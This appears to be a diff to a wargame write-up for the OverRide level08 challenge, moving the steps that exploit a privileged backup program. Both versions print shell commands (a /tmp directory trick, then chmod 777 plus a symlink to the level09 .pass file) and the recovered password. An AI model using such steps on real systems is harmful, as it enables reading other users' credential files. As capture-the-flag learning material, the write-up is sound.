@@ -145,27 +145,7 @@ log_wrapper(FILE_PTR,  "Starting back up: ", argv1)
 }
 ```
 
-so we will try to back-up the content of /home/users/level09/.pass to get the next password
-
-but since we do not have permission to create any file in backups/ we'll use /tmp
-```
-mkdir -p /tmp/backups/home/users/level09
-level08@OverRide:~$ ./level08 /home/users/level09/.pass
-ERROR: Failed to open ./backups//home/users/level09/.pass
-```
-Ooops
-```
-cd /tmp/
-mkdir -p backups/home/users/level09
-level08@OverRide:/tmp$ ~/level08 /home/users/level09/.pass
-
-level08@OverRide:/tmp$ cat ~/backups/.log
-LOG: Starting back up: /home/users/level09/.pass
-
-level08@OverRide:/tmp$ cat backups/home/users/level09/.pass
-fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S
-```
-
+some more debugging
 
 ```
 i alerted open() ret so the prog may not exit
@@ -199,6 +179,27 @@ rax            0x7fffffffe520
 
 want just to see the behavior
 ```
+
+
+so we will try to back-up the content of /home/users/level09/.pass to get the next password
+
+but since we do not have permission to create any file in backups/ we'll use /tmp
+
+or simply use an alias
+```
+level08@OverRide:~$ chmod 777 .
+level08@OverRide:~$ ln -s /home/users/level09/.pass lvl9_pass
+
+level08@OverRide:~$ ./level08 lvl9_pass
+
+level08@OverRide:~$ cat ./backups/.log
+LOG: Starting back up: lvl9_pass
+LOG: Finished back up lvl9_pass
+
+level08@OverRide:~$ cat ./backups/lvl9_pass
+fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S
+```
+
 
 
 
